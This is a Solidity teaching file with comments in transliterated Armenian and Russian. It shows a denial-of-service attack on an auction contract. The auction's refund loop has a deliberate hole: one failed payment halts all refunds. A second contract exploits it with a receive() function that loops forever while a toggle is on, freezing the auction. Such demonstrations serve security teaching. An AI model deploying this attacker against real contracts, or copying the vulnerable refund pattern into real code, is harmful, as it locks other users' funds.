// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract DosAuction {
    mapping(address => uint) public bidders;
    address[] public allBidders;
    uint public refundProgress; // default 0-ya popoxakana vory tuyl talis fiqsenq massivi vor teghn enq minchev het ugharkel bidery

//podxod push stegh contracty het a ugharkim bidery aranc zaprosi
    function bid() external payable {
        bidders[msg.sender] += msg.value;
        allBidders.push(msg.sender);
    }
    // push
    function refund() external {//masivov frrum enq poghery het tanq
        for(uint i = refundProgress; i < allBidders.length; i++) {
            address bidder = allBidders[i];

            (bool success,) = bidder.call{value: bidders[bidder]}("");//tenum enq inchqan a mapingum bid arel u nizkourovneviy zapros enq anum poghi valueov
            require(success, "failed!"); //ay es succes i patcharo

            refundProgress++;
        }
    }
}

//sranov tromuz enq anum yndanrapes bolor vyplataner
contract DosAttack { //eli smart -ov enq anum bid-y
    DosAuction auction; //es ena vor uzum enq jardenq
    bool hack = true;
    address payable owner;

    constructor(address _auction) {
        auction = DosAuction(_auction);
        owner = payable(msg.sender);
    }

    function doBid() external payable {
        auction.bid{value: msg.value}(); //stavka anum
    }
//hach i knopka sghmum em ete uzum em anem tery kara menak
    function toggleHack() external {
        require(msg.sender == owner, "failed");

        hack = !hack;
    }
// kara vobshe chlini succes chi lini, vortev pogh chi galis
    receive() external payable {
        if(hack == true) { // ete uzum em hach anem
            while(true) {} // beskonechni cikl a
        } else {
            owner.transfer(msg.value);
        }
    }
}
